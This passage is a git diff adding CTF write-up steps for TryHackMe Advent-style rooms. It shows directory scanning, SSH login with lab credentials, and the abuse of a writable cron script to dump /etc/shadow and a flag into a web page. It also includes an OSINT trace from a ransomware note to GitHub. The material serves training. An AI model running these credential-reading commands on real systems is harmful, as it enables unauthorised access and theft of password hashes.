@@ -305,38 +305,108 @@ Answer:
 dirb scan with its default wordlist
 
 ```
-dirb machineip
+dirb http://10.10.98.187
 ```
 
 
 
+check the webpage, it seem an iframe ls.html on /admin
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/94c87108-9f8d-4bf0-85ac-b401d8133dbb)
 
+ssh to the machine
 
+```
+ssh mcskidy@10.10.98.187
+Password1
+```
 
+on /home/thegrinch/scripts, you can see 4 script files
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/f53478bf-81e5-4742-81a5-b3748f74eb82)
 
+loot.sh seem interesting and we have write access on it
 
+```
+echo "cat /etc/shadow > /var/www/html/ls.html" > loot.sh
+```
 
+reload the /admin, we will see /etc/shadow
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/1f8d229b-43c3-4638-a9e1-a09627f8a737)
 
+let's have a look at the check.sh script 
 
+```
+echo "cat /home/thegrinch/scripts/check.sh > /var/www/html/ls.html" > loot.sh
+```
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/d4e2afbd-86b8-45fa-bc1c-801a276df610)
 
+checks to see if remindme.txt is on /tmp/check.txt, it will print the grinch's password to pass.html
 
+```
+su thegrinch
+ELFSareFAST
+```
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/9c63292f-78e8-4a17-88e1-97d641133ec4)
 
+we can login to grinch but can't see the flag on his desktop
 
+luckily, we know the path, use the previous vulnerability
 
+```
+echo "cat /home/thegrinch/Desktop/flag.txt > /var/www/html/ls.html" > loot.sh
+```
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/f76b3609-28eb-43e1-b1f7-918f984c209e)
 
+Answer:
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/4a5ec4af-7802-4dba-b315-ff4062ccdd0c)
 
+## Day 15: The Grinchs day off
 
+nothing to do today
 
+## Day 16: Ransomware Madness
 
+our team has managed to collect a sample ransomware note, translate it
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/5d78a8ce-7d9e-47b2-b08b-bb1010125b19)
 
+search on google, i see lot of information here
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/a79ebcf2-0b4c-4c14-b093-673f58c7d3ed)
+
+check his tweeter, i see a post
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/4c5b5392-5a9d-4c43-8e53-f39e34b774a3)
+
+notice there is a bitcoin address on that link
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/d2d86093-5e67-4e3c-9043-f6871c04388f)
+
+click on the bitcoin address, i see it related to github
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/86d8a443-6c12-4c82-9236-c15e8066245e)
+
+follow github account, i see 2 repositories
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/1624bd07-3edb-4174-b19c-aea2ca7af58f)
+
+check commit on tree.sh in ChristBASHTree, you can see the information
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/22290904-ac90-47bd-a4fa-69fc55293db4)
+
+Answer:
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/99fa84d6-4ed1-4955-8047-e503f8fc68d0)
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/4d7d3e0e-828c-4648-b061-111294467eb8)
+
+## Day 17: Elf Leaks
 
 
 
